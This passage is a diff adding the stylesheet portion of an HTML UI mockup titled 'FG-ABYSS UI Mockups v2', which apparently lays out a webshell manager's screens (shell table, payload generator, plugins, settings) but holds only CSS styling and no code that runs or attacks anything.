@@ -1,0 +1,1743 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>FG-ABYSS UI Mockups v2</title>
+<script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  ::-webkit-scrollbar { width: 5px; height: 5px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: #2a2d3a; border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: #3a3f52; }
+  ::-webkit-scrollbar-corner { background: transparent; }
+
+  /* ===== LIGHT THEME OVERRIDES ===== */
+  .app-frame.theme-light { color: #1e2030; }
+  .app-frame.theme-light .m-titlebar { background: #f0f1f7; border-color: rgba(0,0,0,0.09); }
+  .app-frame.theme-light .m-appname { color: #1e2030; }
+  .app-frame.theme-light .m-appsub { color: #5e6c90; }
+  .app-frame.theme-light .m-tb-btn { color: #3f4e6e; }
+  .app-frame.theme-light .m-tb-btn:hover { background: rgba(0,0,0,0.06); color: #1e2030; }
+  .app-frame.theme-light .m-wc-btn { color: #3f4e6e; }
+  .app-frame.theme-light .m-wc-btn:hover { background: rgba(0,0,0,0.06); color: #1e2030; }
+  .app-frame.theme-light .m-wc-close:hover { background: #ef4444; color: #fff; }
+  .app-frame.theme-light .m-sidebar { background: #f0f1f7; border-color: rgba(0,0,0,0.09); }
+  .app-frame.theme-light .m-nav-item { color: #5e6c90; }
+  .app-frame.theme-light .m-nav-item:hover { background: rgba(0,0,0,0.05); color: #1e2030; }
+  .app-frame.theme-light .m-nav-label { color: inherit; }
+  .app-frame.theme-light .m-content { background: #f6f7fc; }
+  .app-frame.theme-light .m-statusbar { background: #f0f1f7; border-color: rgba(0,0,0,0.09); color: #5e6c90; }
+  .app-frame.theme-light .m-divider { background: rgba(0,0,0,0.12); }
+  .app-frame.theme-light .m-stat-num { color: #1e2030; }
+  /* Settings light */
+  .app-frame.theme-light .settings-nav { background: #f0f1f7; border-color: rgba(0,0,0,0.09); }
+  .app-frame.theme-light .settings-item { color: #3f4e6e; }
+  .app-frame.theme-light .settings-item:hover { background: rgba(0,0,0,0.05); color: #1e2030; }
+  .app-frame.theme-light .settings-item.active { background: rgba(79,156,255,0.10); color: #4f9cff; border-left-color: #4f9cff; }
+  .app-frame.theme-light .settings-card { background: #ffffff; border-color: rgba(0,0,0,0.08); }
+  .app-frame.theme-light .section-heading { color: #1e2030; border-color: rgba(0,0,0,0.08); }
+  .app-frame.theme-light .settings-card-title { color: #5e6c90; }
+  .app-frame.theme-light .s-row-label { color: #1e2030; }
+  .app-frame.theme-light .s-row-sub { color: #5e6c90; }
+  .app-frame.theme-light .s-row + .s-row { border-color: rgba(0,0,0,0.05); }
+  .app-frame.theme-light .theme-card { border-color: rgba(0,0,0,0.12); }
+  .app-frame.theme-light .theme-card:hover { border-color: rgba(0,0,0,0.22); }
+  .app-frame.theme-light .theme-card.active { border-color: #4f9cff; }
+  .app-frame.theme-light .theme-label { color: #5e6c90; }
+  .app-frame.theme-light .theme-card.active .theme-label { color: #4f9cff; }
+  .app-frame.theme-light .accent-custom { background: #e8eaf0; border-color: #c8ccd8; }
+  .app-frame.theme-light .radio-btn { background: #eef0f6; border-color: rgba(0,0,0,0.10); color: #3f4e6e; }
+  .app-frame.theme-light .radio-btn.active { background: #4f9cff; border-color: #4f9cff; color: #fff; }
+  .app-frame.theme-light .m-slider { background: rgba(0,0,0,0.12); }
+  .app-frame.theme-light .level-badge { background: rgba(79,156,255,0.10); color: #4f9cff; }
+  .app-frame.theme-light .m-switch { background: rgba(0,0,0,0.15); }
+  .app-frame.theme-light .m-switch.on { background: #4f9cff; }
+  .app-frame.theme-light .key-input { background: #eef0f6; border-color: rgba(0,0,0,0.10); color: #1e2030; }
+  .app-frame.theme-light .enc-badge { color: #3f4e6e; }
+  .app-frame.theme-light .s-btn-default { background: #eef0f6; border-color: rgba(0,0,0,0.10); color: #3f4e6e; }
+  /* Home light */
+  .app-frame.theme-light .home-title { color: #1e2030; }
+  .app-frame.theme-light .home-date { color: #5e6c90; }
+  .app-frame.theme-light .stat-card { background: #ffffff; border-color: rgba(0,0,0,0.08); }
+  .app-frame.theme-light .stat-label { color: #5e6c90; }
+  .app-frame.theme-light .stat-num { color: #1e2030; }
+  .app-frame.theme-light .section-title { color: #1e2030; }
+  /* Project tree light */
+  .app-frame.theme-light .project-tree { background: #f0f1f7; border-color: rgba(0,0,0,0.09); }
+  .app-frame.theme-light .tree-header { border-color: rgba(0,0,0,0.09); }
+  .app-frame.theme-light .tree-item { color: #3f4e6e; }
+  .app-frame.theme-light .tree-item:hover { background: rgba(0,0,0,0.05); color: #1e2030; }
+  .app-frame.theme-light .tree-item.active { background: rgba(79,156,255,0.10); color: #4f9cff; }
+  .app-frame.theme-light .tree-count { background: rgba(0,0,0,0.07); color: #5e6c90; }
+  .app-frame.theme-light .tree-item.active .tree-count { background: rgba(79,156,255,0.15); color: #4f9cff; }
+  /* Shell table toolbar light */
+  .app-frame.theme-light .table-toolbar { border-color: rgba(0,0,0,0.09); }
+  .app-frame.theme-light .s-input { background: #eef0f6; border-color: rgba(0,0,0,0.10); color: #1e2030; }
+  .app-frame.theme-light .shell-table th { background: #eef0f6; color: #5e6c90; border-color: rgba(0,0,0,0.09); }
+  .app-frame.theme-light .shell-table td { border-color: rgba(0,0,0,0.05); color: #1e2030; }
+  .app-frame.theme-light .shell-table tr:hover td { background: rgba(0,0,0,0.04); }
+  .app-frame.theme-light .s-mono { color: #3f4e6e; }
+  .app-frame.theme-light .note-cell { color: #5e6c90; }
+  .app-frame.theme-light .row-act-btn { color: #5e6c90; }
+  .app-frame.theme-light .row-act-btn:hover { background: rgba(0,0,0,0.06); color: #1e2030; }
+  .app-frame.theme-light .table-footer { border-color: rgba(0,0,0,0.09); }
+  .app-frame.theme-light .page-btn { color: #5e6c90; }
+  .app-frame.theme-light .page-btn:hover { background: rgba(0,0,0,0.06); color: #1e2030; }
+  .app-frame.theme-light .page-size-select { background: #eef0f6; border-color: rgba(0,0,0,0.10); color: #3f4e6e; }
+  .app-frame.theme-light .batch-bar { background: #eef0f6; border-color: rgba(0,0,0,0.09); }
+  .app-frame.theme-light .batch-action { color: #3f4e6e; }
+  .app-frame.theme-light .batch-action:hover { background: rgba(0,0,0,0.06); }
+  /* Payload light */
+  .app-frame.theme-light .config-panel { border-color: rgba(0,0,0,0.09); }
+  .app-frame.theme-light .field-label { color: #5e6c90; }
+  .app-frame.theme-light .radio-item { color: #3f4e6e; }
+  .app-frame.theme-light .radio-item.active { color: #1e2030; }
+  .app-frame.theme-light .radio-circle { border-color: rgba(0,0,0,0.20); }
+  .app-frame.theme-light .check-item { color: #3f4e6e; }
+  .app-frame.theme-light .check-item.checked { color: #1e2030; }
+  .app-frame.theme-light .check-box { border-color: rgba(0,0,0,0.20); }
+  .app-frame.theme-light .strength-seg { background: rgba(0,0,0,0.10); }
+  .app-frame.theme-light .icon-btn { color: #5e6c90; }
+  .app-frame.theme-light .icon-btn:hover { background: rgba(0,0,0,0.06); color: #1e2030; }
+  /* Plugin light */
+  .app-frame.theme-light .plugin-toolbar { border-color: rgba(0,0,0,0.09); }
+  .app-frame.theme-light .plugin-count { color: #5e6c90; }
+  .app-frame.theme-light .filter-tab { color: #3f4e6e; }
+  .app-frame.theme-light .filter-tab:hover { background: rgba(0,0,0,0.05); color: #1e2030; }
+  .app-frame.theme-light .plugin-card { background: #ffffff; border-color: rgba(0,0,0,0.09); }
+  .app-frame.theme-light .plugin-card:hover { border-color: rgba(0,0,0,0.18); }
+  .app-frame.theme-light .plugin-name { color: #1e2030; }
+  .app-frame.theme-light .plugin-desc { color: #3f4e6e; }
+  .app-frame.theme-light .ver-badge { color: #5e6c90; }
+  .app-frame.theme-light .third-badge { background: rgba(0,0,0,0.07); color: #3f4e6e; }
+  .app-frame.theme-light .switch-row { color: #3f4e6e; }
+  .app-frame.theme-light .uninstall-btn { color: #5e6c90; }
+  /* Scrollbar light */
+  .app-frame.theme-light ::-webkit-scrollbar-thumb { background: #c8ccd8; }
+  .app-frame.theme-light ::-webkit-scrollbar-thumb:hover { background: #adb3c4; }
+  body {
+    font-family: 'Inter', -apple-system, 'Segoe UI', sans-serif;
+    background: #09090c;
+    color: #e2e4ed;
+    font-size: 13px;
+    padding: 24px;
+  }
+  h2 { font-size: 18px; font-weight: 700; margin-bottom: 4px; }
+  .subtitle { font-size: 13px; color: #7a829a; margin-bottom: 20px; }
+
+  .tabs { display: flex; gap: 4px; margin-bottom: 20px; border-bottom: 1px solid #1f2130; padding-bottom: 0; }
+  .tab-btn {
+    padding: 8px 16px; background: transparent; border: none;
+    color: #7a829a; cursor: pointer; font-size: 13px;
+    border-bottom: 2px solid transparent; margin-bottom: -1px; transition: all 120ms;
+  }
+  .tab-btn:hover { color: #e2e4ed; }
+  .tab-btn.active { color: #4f9cff; border-bottom-color: #4f9cff; font-weight: 600; }
+  .tab-panel { display: none; }
+  .tab-panel.active { display: block; }
+
+  .app-frame {
+    border: 1px solid #1f2130; border-radius: 8px; overflow: hidden;
+    height: 560px; display: flex; flex-direction: column;
+    box-shadow: 0 24px 48px rgba(0,0,0,0.6); position: relative;
+  }
+
+  /* Titlebar */
+  .m-titlebar {
+    height: 48px; background: #09090c; border-bottom: 1px solid #1f2130;
+    display: flex; align-items: center; justify-content: space-between;
+    flex-shrink: 0; user-select: none;
+  }
+  .m-tb-left { display: flex; align-items: center; gap: 8px; padding-left: 16px; }
+  .m-logo {
+    width: 24px; height: 24px;
+    background: linear-gradient(135deg, #4f9cff 0%, #22d3ee 100%);
+    border-radius: 4px; display: flex; align-items: center; justify-content: center;
+    font-size: 12px; font-weight: 700; color: #09090c;
+  }
+  .m-appname { font-size: 13px; font-weight: 600; color: #e2e4ed; }
+  .m-appsub { font-size: 11px; color: #646b85; margin-left: 2px; letter-spacing: .08em; }
+  .m-tb-right { display: flex; align-items: center; height: 100%; }
+  .m-tb-btn {
+    width: 32px; height: 32px; display: flex; align-items: center; justify-content: center;
+    background: transparent; border: none; color: #7a829a; cursor: pointer; border-radius: 4px; margin: 0 2px; font-size: 14px;
+  }
+  .m-tb-btn:hover { background: #191b23; color: #e2e4ed; }
+  .m-wc { display: flex; align-items: center; height: 100%; margin-left: 4px; }
+  .m-wc-btn { width: 40px; height: 48px; display: flex; align-items: center; justify-content: center; border: none; background: transparent; color: #7a829a; cursor: default; font-size: 12px; }
+  .m-wc-btn:hover { background: #191b23; color: #e2e4ed; }
+  .m-wc-close { width: 48px; }
+  .m-wc-close:hover { background: #ef4444; color: #fff; }
+
+  .m-body { display: flex; flex: 1; overflow: hidden; }
+
+  /* ====== NEW SIDEBAR: Square nav items ====== */
+  .m-sidebar {
+    width: 80px;
+    flex-shrink: 0;
+    background: #09090c;
+    border-right: 1px solid #1f2130;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    overflow: hidden;
+  }
+  .m-nav {
+    flex: 1;
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 8px 0;
+    gap: 2px;
+  }
+  .m-nav-item {
+    width: 64px;
+    height: 64px;
+    border-radius: 8px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 5px;
+    cursor: pointer;
+    color: #646b85;
+    border: none;
+    background: transparent;
+    transition: all 80ms ease-out;
+    text-decoration: none;
+    position: relative;
+  }
+  .m-nav-item:hover {
+    background: #191b23;
+    color: #7a829a;
+  }
+  .m-nav-item.active {
+    background: rgba(79,156,255,0.12);
+    color: #4f9cff;
+  }
+  /* Active indicator: left 3px accent bar */
+  .m-nav-item.active::before {
+    content: '';
+    position: absolute;
+    left: -8px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 3px;
+    height: 24px;
+    background: #4f9cff;
+    border-radius: 0 2px 2px 0;
+  }
+  .m-nav-icon {
+    font-size: 20px;
+    line-height: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .m-nav-label {
+    font-size: 11px;
+    line-height: 1;
+    text-align: center;
+    letter-spacing: 0.01em;
+  }
+  .m-nav-item.active .m-nav-label { color: #4f9cff; }
+  .m-nav-item.active .m-nav-icon  { color: #4f9cff; }
+
+  .m-content { flex: 1; overflow: hidden; position: relative; background: #0d0e13; }
+  .m-statusbar {
+    height: 28px; background: #09090c; border-top: 1px solid #1f2130;
+    display: flex; align-items: center; gap: 8px; padding: 0 16px;
+    font-size: 12px; color: #7a829a; flex-shrink: 0;
+  }
+  .m-status-dot { width: 8px; height: 8px; border-radius: 50%; background: #646b85; }
+  .m-status-dot.active {
+    background: #4ade80;
+    animation: pulse-dot 2.4s ease-in-out infinite;
+  }
+  @keyframes pulse-dot {
+    0%,100% { box-shadow: 0 0 0 0 rgba(74,222,128,0.4) }
+    50%      { box-shadow: 0 0 0 5px rgba(74,222,128,0) }
+  }
+  .m-divider { width: 1px; height: 12px; background: #1f2130; }
+  .m-stat-num { font-family: monospace; font-variant-numeric: tabular-nums; color: #e2e4ed; }
+
+  /* HOME */
+  .home-view { padding: 24px; height: 100%; overflow-y: auto; display: flex; flex-direction: column; gap: 24px; }
+  .home-header { display: flex; align-items: baseline; justify-content: space-between; }
+  .home-title { font-size: 20px; font-weight: 700; }
+  .home-date { font-size: 12px; color: #646b85; font-family: monospace; }
+  .stat-cards { display: grid; grid-template-columns: repeat(4,1fr); gap: 16px; }
+  .stat-card {
+    background: #13141a; border: 1px solid rgba(255,255,255,0.08);
+    border-left: 3px solid #4f9cff; border-radius: 6px;
+    padding: 16px; display: flex; align-items: center; gap: 12px;
+  }
+  .stat-icon { font-size: 20px; color: #4f9cff; flex-shrink: 0; }
+  .stat-num { font-size: 20px; font-weight: 700; font-family: monospace; font-variant-numeric: tabular-nums; }
+  .stat-label { font-size: 12px; color: #7a829a; margin-top: 2px; }
+  .section-title { font-size: 14px; font-weight: 600; margin-bottom: 12px; }
+  .empty-state { display: flex; flex-direction: column; align-items: center; gap: 12px; padding: 32px 0; }
+  .empty-icon { font-size: 48px; color: #1f2130; }
+  .btn-primary { background: #4f9cff; color: #fff; border: none; padding: 0 16px; height: 36px; border-radius: 6px; font-size: 13px; cursor: pointer; }
+
+  /* PROJECT */
+  .project-view { display: flex; height: 100%; overflow: hidden; }
+  .project-tree { width: 220px; flex-shrink: 0; background: #09090c; border-right: 1px solid #1f2130; display: flex; flex-direction: column; }
+  .tree-header { padding: 12px; border-bottom: 1px solid #1f2130; }
+  .tree-list { flex: 1; overflow-y: auto; padding: 8px 0; }
+  .tree-item { display: flex; align-items: center; gap: 6px; height: 36px; padding: 0 12px; cursor: pointer; color: #7a829a; font-size: 13px; border-radius: 4px; margin: 0 4px; }
+  .tree-item:hover { background: #191b23; color: #e2e4ed; }
+  .tree-item.active { background: rgba(79,156,255,0.12); color: #4f9cff; font-weight: 600; }
+  .tree-name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .tree-count { font-size: 11px; color: #646b85; font-family: monospace; background: #191b23; padding: 1px 5px; border-radius: 10px; flex-shrink: 0; }
+  .tree-item.active .tree-count { background: rgba(79,156,255,0.15); color: #4f9cff; }
+  .tree-chevron { flex-shrink: 0; transition: transform 150ms ease; }
+  .tree-group.collapsed .tree-chevron { transform: rotate(-90deg); }
+  .tree-children { display: flex; flex-direction: column; }
+  .tree-children.collapsed { display: none; }
+  .tree-child { padding-left: 28px !important; font-size: 12px; height: 32px !important; }
+  .shell-area { flex: 1; display: flex; flex-direction: column; overflow: hidden; position: relative; }
+  .table-toolbar { display: flex; align-items: center; gap: 8px; padding: 10px 14px; border-bottom: 1px solid #1f2130; }
+  .s-input { height: 28px; background: #13141a; border: 1px solid #1f2130; border-radius: 4px; color: #e2e4ed; padding: 0 8px; font-size: 12px; }
+  .s-btn { height: 28px; padding: 0 10px; border-radius: 4px; font-size: 12px; cursor: pointer; }
+  .s-btn-primary { background: #4f9cff; color: #fff; border: none; }
+  .s-btn-default { background: #13141a; color: #7a829a; border: 1px solid #1f2130; }
+  .spacer { flex: 1; }
+  .shell-table-wrap { flex: 1; overflow-y: auto; }
+  .shell-table { width: 100%; border-collapse: collapse; }
+  .shell-table th { height: 36px; background: #13141a; color: #7a829a; font-size: 12px; font-weight: 500; text-align: left; padding: 0 10px; border-bottom: 1px solid #1f2130; position: sticky; top: 0; }
+  .shell-table td { height: 40px; padding: 0 10px; border-bottom: 1px solid #1f2130; font-size: 12px; }
+  .shell-table tr:hover td { background: #191b23; }
+  .shell-table tr:hover .row-actions { opacity: 1; }
+  .s-dot { width: 7px; height: 7px; border-radius: 50%; display: inline-block; flex-shrink: 0; }
+  .s-dot.active { background: #4ade80; box-shadow: 0 0 0 2px rgba(74,222,128,0.2); }
+  .s-dot.offline { background: #646b85; }
+  .s-dot.timeout { background: #f59e0b; box-shadow: 0 0 0 2px rgba(245,158,11,0.2); }
+  .status-cell { display: flex; align-items: center; gap: 6px; }
+  .status-text { font-size: 12px; }
+  .status-text.active { color: #4ade80; }
+  .status-text.offline { color: #646b85; }
+  .status-text.timeout { color: #f59e0b; }
+  .enc-badge { font-size: 11px; font-family: monospace; color: #94a3b8; }
+  .note-cell { font-size: 12px; color: #646b85; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 100px; }
+  .s-mono { font-family: monospace; font-size: 11px; color: #7a829a; }
+  .s-badge { padding: 2px 6px; border-radius: 4px; font-size: 11px; font-family: monospace; }
+  .s-php { background: rgba(79,156,255,0.15); color: #4f9cff; }
+  .s-jsp { background: rgba(251,146,60,0.15); color: #fb923c; }
+  .row-actions { opacity: 0; display: flex; gap: 2px; transition: opacity 80ms; }
+  .row-act-btn { background: transparent; border: none; color: #7a829a; cursor: pointer; padding: 3px 5px; border-radius: 4px; font-size: 13px; }
+  .row-act-btn:hover { background: #1f2130; color: #e2e4ed; }
+  /* Batch-select column: hidden by default */
+  .shell-area .batch-col { display: none; }
+  .shell-area.batch-mode .batch-col { display: table-cell; }
+  /* Batch bar: hidden by default */
+  .batch-bar {
+    position: absolute; bottom: 0; left: 0; right: 0; height: 48px;
+    background: #13141a; border-top: 1px solid #1f2130;
+    display: none; align-items: center; gap: 16px; padding: 0 16px; z-index: 10;
+    animation: slide-up 120ms ease-out;
+  }
+  @keyframes slide-up {
+    from { transform: translateY(100%); opacity: 0; }
+    to   { transform: translateY(0);    opacity: 1; }
+  }
+  .shell-area.batch-mode .batch-bar { display: flex; }
+  /* Batch toggle button active state */
+  .batch-toggle-btn.active {
+    background: rgba(79,156,255,0.12) !important;
+    color: #4f9cff !important;
+    border-color: rgba(79,156,255,0.3) !important;
+  }
+  .batch-count { color: #4f9cff; font-weight: 600; }
+  .batch-action { background: transparent; border: none; color: #7a829a; cursor: pointer; font-size: 12px; padding: 0 8px; height: 28px; border-radius: 4px; }
+  .batch-action:hover { background: #191b23; }
+  .batch-del { color: #f87171; }
+  .table-footer { display: flex; align-items: center; justify-content: space-between; padding: 6px 14px; border-top: 1px solid #1f2130; flex-shrink: 0; }
+  .pagination { display: flex; align-items: center; gap: 2px; }
+  .page-btn { min-width: 28px; height: 28px; padding: 0 6px; border-radius: 4px; border: 1px solid transparent; background: transparent; color: #7a829a; font-size: 12px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-family: monospace; }
+  .page-btn:hover { background: #191b23; color: #e2e4ed; }
+  .page-btn.active { background: rgba(79,156,255,0.12); border-color: rgba(79,156,255,0.25); color: #4f9cff; font-weight: 600; }
+  .page-btn:disabled { opacity: 0.3; cursor: default; }
+  .page-size-select { height: 26px; background: #13141a; border: 1px solid #1f2130; border-radius: 4px; color: #7a829a; padding: 0 6px; font-size: 12px; cursor: pointer; }
+
+  /* PAYLOAD */
+  .payload-view { display: flex; height: 100%; overflow: hidden; }
+  .config-panel { width: 300px; flex-shrink: 0; border-right: 1px solid #1f2130; display: flex; flex-direction: column; overflow-y: auto; padding: 16px; gap: 16px; }
+  .field-label { font-size: 11px; font-weight: 500; color: #7a829a; margin-bottom: 6px; display: block; text-transform: uppercase; letter-spacing: .05em; }
+  .radio-group { display: flex; gap: 4px; flex-wrap: wrap; }
+  .radio-btn { padding: 0 10px; height: 30px; border-radius: 4px; border: 1px solid #1f2130; background: #13141a; color: #7a829a; font-size: 12px; cursor: pointer; }
+  .radio-btn.active { background: #4f9cff; border-color: #4f9cff; color: #fff; font-weight: 600; }
+  .radio-list { display: flex; flex-direction: column; gap: 8px; }
+  .radio-item { display: flex; align-items: center; gap: 8px; color: #7a829a; font-size: 12px; cursor: pointer; }
+  .radio-circle { width: 13px; height: 13px; border-radius: 50%; border: 2px solid #1f2130; flex-shrink: 0; }
+  .radio-item.active .radio-circle { border-color: #4f9cff; background: radial-gradient(circle, #4f9cff 3px, transparent 3px); }
+  .radio-item.active { color: #e2e4ed; }
+  .key-row { display: flex; gap: 4px; align-items: center; }
+  .key-input { flex: 1; height: 34px; background: #13141a; border: 1px solid #1f2130; border-radius: 6px; color: #e2e4ed; padding: 0 8px; font-family: monospace; font-size: 12px; }
+  .icon-btn { width: 30px; height: 30px; background: transparent; border: none; color: #7a829a; cursor: pointer; border-radius: 4px; font-size: 13px; display: flex; align-items: center; justify-content: center; }
+  .strength-bar { display: flex; gap: 3px; margin-top: 6px; }
+  .strength-seg { height: 3px; flex: 1; border-radius: 2px; background: #1f2130; }
+  .strength-seg.s1 { background: #f87171; }
+  .strength-seg.s2 { background: #fbbf24; }
+  .slider-row { display: flex; align-items: center; gap: 10px; }
+  .m-slider { flex: 1; height: 4px; background: #1f2130; border-radius: 2px; position: relative; }
+  .m-slider-fill { height: 4px; background: #4f9cff; border-radius: 2px; width: 40%; }
+  .m-slider-dot { width: 12px; height: 12px; background: #4f9cff; border-radius: 50%; position: absolute; top: -4px; left: 40%; transform: translateX(-50%); }
+  .level-badge { background: rgba(79,156,255,0.12); color: #4f9cff; font-family: monospace; padding: 2px 8px; border-radius: 4px; font-size: 12px; min-width: 28px; text-align: center; }
+  .check-list { display: flex; flex-direction: column; gap: 6px; }
+  .check-item { display: flex; align-items: center; gap: 8px; font-size: 12px; color: #7a829a; cursor: pointer; }
+  .check-box { width: 13px; height: 13px; border: 2px solid #1f2130; border-radius: 3px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; font-size: 9px; }
+  .check-item.checked .check-box { background: #4f9cff; border-color: #4f9cff; color: #fff; }
+  .gen-btn { height: 40px; background: #4f9cff; color: #fff; border: none; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; }
+  .code-panel { flex: 1; display: flex; flex-direction: column; background: #0c0d11; overflow: hidden; }
+  .code-toolbar { display: flex; align-items: center; justify-content: flex-end; gap: 4px; padding: 8px 12px; background: #16181f; border-bottom: 1px solid #1a1c26; }
+  .code-body { flex: 1; overflow-y: auto; padding: 16px; font-family: monospace; font-size: 12px; line-height: 1.7; color: #abb2bf; }
+  .code-kw { color: #c678dd; } .code-str { color: #98c379; } .code-var { color: #e06c75; } .code-fn { color: #61afef; }
+  .code-status-bar { padding: 6px 12px; background: #16181f; border-top: 1px solid #1a1c26; font-size: 11px; color: #646b85; font-family: monospace; text-align: right; }
+
+  /* ===== PAYLOAD IMPROVEMENTS ===== */
+  .payload-section { display: flex; flex-direction: column; gap: 6px; }
+  .field-hint { font-size: 11px; color: #646b85; line-height: 1.4; }
+  .enc-options { display: flex; flex-direction: column; gap: 1px; background: #191b23; border-radius: 6px; overflow: hidden; border: 1px solid #1f2130; }
+  .enc-option { display: flex; align-items: center; gap: 8px; padding: 9px 12px; cursor: pointer; transition: background 80ms; }
+  .enc-option:hover { background: #1f2233; }
+  .enc-option.active { background: rgba(var(--accent-rgb), 0.08); }
+  .enc-name { flex: 1; font-size: 12px; color: #e2e4ed; font-family: monospace; }
+  .enc-tag { font-size: 10px; padding: 1px 6px; border-radius: 3px; font-weight: 600; flex-shrink: 0; }
+  .enc-tag-rec { background: rgba(74,222,128,0.15); color: #4ade80; }
+  .enc-tag-compat { background: rgba(251,146,60,0.12); color: #fb923c; }
+  .enc-tag-warn { background: rgba(248,113,113,0.12); color: #f87171; }
+  .strength-label { font-size: 11px; color: #646b85; }
+  .strength-label.weak { color: #f87171; }
+  .strength-label.medium { color: #fbbf24; }
+  .strength-label.strong { color: #4ade80; }
+  .code-with-nums { display: flex; flex: 1; overflow-y: auto; }
+  .line-nums { padding: 16px 8px 16px 12px; font-family: monospace; font-size: 12px; line-height: 1.7; color: #3a3f52; text-align: right; user-select: none; flex-shrink: 0; border-right: 1px solid #1a1c26; background: #0e0f14; }
+  .code-body-inner { flex: 1; overflow-y: auto; padding: 16px 16px 16px 14px; font-family: monospace; font-size: 12px; line-height: 1.7; color: #abb2bf; }
+  .diff-view { flex: 1; display: flex; overflow: hidden; }
+  .diff-col { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+  .diff-col + .diff-col { border-left: 1px solid #1a1c26; }
+  .diff-col-hdr { padding: 6px 12px; background: #0e0f14; border-bottom: 1px solid #1a1c26; font-size: 11px; color: #646b85; font-weight: 600; display: flex; align-items: center; gap: 6px; }
+  .diff-col-hdr.obf { color: #4ade80; }
+  .diff-act-btn { background: transparent; border: 1px solid #1f2130; color: #7a829a; font-size: 11px; padding: 0 8px; height: 24px; border-radius: 4px; cursor: pointer; display: flex; align-items: center; gap: 4px; }
+  .diff-act-btn:hover { background: #191b23; color: #e2e4ed; }
+  .diff-act-btn.on { background: rgba(var(--accent-rgb),0.10); border-color: rgba(var(--accent-rgb),0.3); color: var(--accent); }
+  /* gen button states */
+  .gen-btn.loading { opacity: 0.7; cursor: not-allowed; }
+  .gen-btn.success { background: #4ade80 !important; }
+  .gen-btn.error { background: transparent; border: 1px solid #f87171; color: #f87171; }
+  /* light theme payload */
+  .app-frame.theme-light .enc-options { background: #eef0f6; border-color: rgba(0,0,0,0.09); }
+  .app-frame.theme-light .enc-option:hover { background: rgba(0,0,0,0.04); }
+  .app-frame.theme-light .enc-option.active { background: rgba(var(--accent-rgb),0.07); }
+  .app-frame.theme-light .enc-name { color: #1e2030; }
+  .app-frame.theme-light .field-hint { color: #5e6c90; }
+
+  /* PLUGIN */
+  .plugin-view { height: 100%; display: flex; flex-direction: column; overflow: hidden; }
+  .plugin-toolbar { display: flex; align-items: center; gap: 8px; padding: 10px 16px; border-bottom: 1px solid #1f2130; flex-shrink: 0; }
+  .plugin-count { font-size: 13px; color: #7a829a; }
+  .filter-tabs { display: flex; gap: 4px; }
+  .filter-tab { height: 28px; padding: 0 12px; border-radius: 4px; border: 1px solid transparent; background: transparent; color: #7a829a; font-size: 12px; cursor: pointer; transition: all 80ms; }
+  .filter-tab:hover { background: #191b23; color: #e2e4ed; }
+  .filter-tab.active { background: rgba(79,156,255,0.12); color: #4f9cff; border-color: rgba(79,156,255,0.2); font-weight: 600; }
+  .plugin-grid { flex: 1; overflow-y: auto; padding: 16px; display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 12px; align-content: start; }
+  .plugin-card {
+    background: #13141a; border: 1px solid rgba(255,255,255,0.08); border-radius: 6px; padding: 16px;
+    display: flex; flex-direction: column; gap: 10px; cursor: default; transition: border-color 120ms;
+  }
+  .plugin-card:hover { border-color: rgba(255,255,255,0.16); }
+  .plugin-card.disabled { opacity: 0.5; }
+  .card-header { display: flex; align-items: flex-start; justify-content: space-between; gap: 8px; }
+  .plugin-name { font-size: 13px; font-weight: 600; color: #e2e4ed; }
+  .card-badges { display: flex; align-items: center; gap: 4px; flex-shrink: 0; }
+  .ver-badge { font-size: 11px; color: #646b85; font-family: monospace; }
+  .builtin-badge { font-size: 10px; background: rgba(79,156,255,0.12); color: #4f9cff; padding: 1px 5px; border-radius: 3px; }
+  .third-badge { font-size: 10px; background: #1f2130; color: #7a829a; padding: 1px 5px; border-radius: 3px; }
+  .plugin-desc { font-size: 12px; color: #7a829a; line-height: 1.5; flex: 1; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+  .card-footer { display: flex; align-items: center; justify-content: space-between; }
+  .switch-row { display: flex; align-items: center; gap: 8px; font-size: 12px; color: #7a829a; }
+  .m-switch { width: 32px; height: 18px; border-radius: 9px; background: #1f2130; cursor: pointer; position: relative; transition: background 120ms; }
+  .m-switch.on { background: #4f9cff; }
+  .m-switch::after { content: ''; position: absolute; top: 2px; left: 2px; width: 14px; height: 14px; border-radius: 50%; background: #fff; transition: transform 120ms; }
+  .m-switch.on::after { transform: translateX(14px); }
+  .uninstall-btn { background: transparent; border: none; color: #7a829a; font-size: 11px; cursor: pointer; padding: 2px 6px; border-radius: 3px; }
+  .uninstall-btn:hover { color: #f87171; }
+
+  /* SETTINGS */
+  .settings-view { display: flex; height: 100%; overflow: hidden; }
+  .settings-nav { width: 164px; flex-shrink: 0; background: #09090c; border-right: 1px solid #1f2130; padding: 10px 0; display: flex; flex-direction: column; }
+  .settings-item { display: flex; align-items: center; gap: 8px; height: 38px; padding: 0 14px; border: none; border-left: 2px solid transparent; background: transparent; color: #7a829a; font-size: 13px; cursor: pointer; text-align: left; width: 100%; white-space: nowrap; transition: all 80ms; }
+  .settings-item:hover { background: rgba(255,255,255,0.04); color: #e2e4ed; }
+  .settings-item.active { border-left-color: #4f9cff; background: rgba(79,156,255,0.10); color: #4f9cff; font-weight: 600; }
+  .settings-content { flex: 1; overflow-y: auto; padding: 22px 24px; display: flex; flex-direction: column; gap: 18px; }
+  .settings-panel { display: flex; flex-direction: column; gap: 14px; }
